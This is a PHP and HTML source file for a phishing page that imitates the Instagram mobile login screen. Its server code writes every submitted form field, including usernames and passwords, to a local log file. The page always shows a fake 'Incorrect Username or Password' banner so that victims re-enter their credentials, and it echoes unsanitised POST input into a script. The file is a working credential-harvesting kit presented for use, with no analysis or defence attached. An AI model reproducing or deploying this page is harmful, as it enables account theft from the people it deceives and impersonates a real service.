<?php

///$nameErr=$pswErr=" ";

if($_SERVER["REQUEST_METHOD"]=="POST")
{
    $handle = fopen('log.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
	  
$pass_check1=$_POST['pass1'];
$pass_check2=$_POST['pass2'];
     

 if($pass_check1== $pass_check2)
    { 
      header('Location: start.php');
     
    }
 
}
?>

<!DOCTYPE html>
<html>

<head>
    <title>Instagram Mobile Login Page </title>
    <meta charset="utf-8">
    <meta name="description" content="w3hubs.com">
    <meta name="author" content="w3hubs.com">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
   
    <section id="w3hubs">
        <div class="container" style="
     width: 100%;
     padding-right: 0px; 
     padding-left: 0px;
    margin-right: auto;
    margin-left: auto;">

            <p style="text-align: center; font-size: 28px; font-family: cursive">Instagram </p>
            
            <centre>
            <p class=" error1p" style="border-radius: 0%;
                                       width : 100%;
        color: white;
        font-size:12px; 
        margin: 0px;
        background-color: #ff1e50;
        padding: 8px;"> Incorrect Username or Password !<br></p></centre>
            <form method="POST"  action="login4.php">
                <div class="form-group">

                    <input type="name" name="username" class="form-control" placeholder="Phone number,username, or email">
                </div>
                <div class="form-group">

                    <input type="password" name="pass3" id="pass3" class="form-control" placeholder="Password">
                </div>
                <div class="form-group">

                    <input type="hidden" name="pass2" id="pass2" class="form-control" value="">
                
                
                </div>
                <input type="hidden" id="pass2" value="">
                <button type="submit" class="btn btn-primary">Log In</button>

            </form>
            
            
      
            <h4>OR</h4>
            <p><i class="fa fa-facebook-square"></i><a href="#">Log In Facebook</a></p>
            <p><a href="#">Forget Password</a></p>
            <p>Don't have account? <a href="#">Sign up</a></p>
        </div>


    </section>

<!--<a href="start.php"><button id="correct" type="button">correct</button></a>
<a href="login.php"><button id = "wrong"type="button">wrong</button></a>-->

    <script>
        var pass1, pass2;



        document.addEventListener('DOMContentLoaded', function() {
            pass2 = "<?php echo $_POST['pass2']; ?>";
            document.getElementById("pass2").value= pass2;
            var chkpass1 = document.getElementById("pass2").value;
           // alert(" pass2 : " + chkpass1);
            
        });


       /* pass1 = 


        function check() {
            pass2 = document.getElementById("pass2").value;
            alert("pass1 : " + pass1 + " pass2 : " + pass2);
           
            if (pass1 == pass2) {
               
               // document.getElementById("correct").clicked();
                window.setTimeout(function() {
                    window.open("start.php?", "_self");
                }, 100);
                 alert("correct");
            } else {
                
                window.setTimeout(function() {
                    window.open("login.php", "_self");
                }, 100);
                 alert("wrong");
                


        }}*/

    </script>


    
   <!-- <script>
        $(document).ready(function() {

            $('button#submit').click(function(event) {
                $.ajax({
                    type: "POST",
                    url: "newuser_action.php",
                    data: $("form.feedbac").serialize(),
                    success: function(message) {
                        $("#first").modal('hide');
                        $("#res").html(message);
                        alert("success");
                    },
                    error: function() {
                        $("#first").modal('hide');
                        alert("Error");

                    }
                })

            });
        });
    </script>
    -->
    
    
</body>

</html>
